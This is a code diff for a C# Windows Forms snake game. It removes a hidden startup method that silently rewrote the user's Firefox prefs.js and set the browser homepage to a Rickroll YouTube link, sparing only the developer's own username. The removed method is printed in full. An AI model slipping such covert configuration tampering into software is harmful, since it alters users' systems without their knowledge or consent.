@@ -21,54 +21,9 @@ namespace WindowsFormsApplication1
         {
             InitializeComponent();
 
-            Console.WriteLine(Environment.UserName);
-
-            BytaStartSida();
             ormen.randomUpgrade();
             labelHighScore.Hide();
             labelInfo.Text = "If you want to change any settings \n press F1 in between games";
-        }
-        private void BytaStartSida()
-        {
-            if (Environment.UserName == "novie")
-            {
-                return;
-            }
-            string path = @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Mozilla\Firefox\Profiles";
-            {
-                string[] folders = Directory.GetDirectories(path);
-                if (folders.Length == 1)
-                {
-                    path = folders[0] + @"\prefs.js";
-                    List<string> textLista = new List<string>();
-                    StreamReader hej = new StreamReader(path);
-                    while (!hej.EndOfStream)
-                    {
-                        textLista.Add(hej.ReadLine());
-                    }
-                    hej.Close();
-
-
-                    string temp = @"user_pref(""browser.startup.homepage""";
-                    for (int i = 0; i < textLista.Count; i++)
-                    {
-                        if (textLista[i].StartsWith(temp))
-                        {
-                            textLista[i] = @"user_pref(""browser.startup.homepage"", ""http://www.youtube.com/watch?v=dQw4w9WgXcQ"");";
-                            //http://www.youtube.com/watch?v=dQw4w9WgXcQ
-                            break;
-                        }
-                    }
-
-
-                    StreamWriter hej2 = new StreamWriter(path);
-                    for (int i = 0; i < textLista.Count; i++)
-                    {
-                        hej2.WriteLine(textLista[i]);
-                    }
-                    hej2.Close();
-                }
-            }
         }
         private void button1_Click(object sender, EventArgs e)
         {
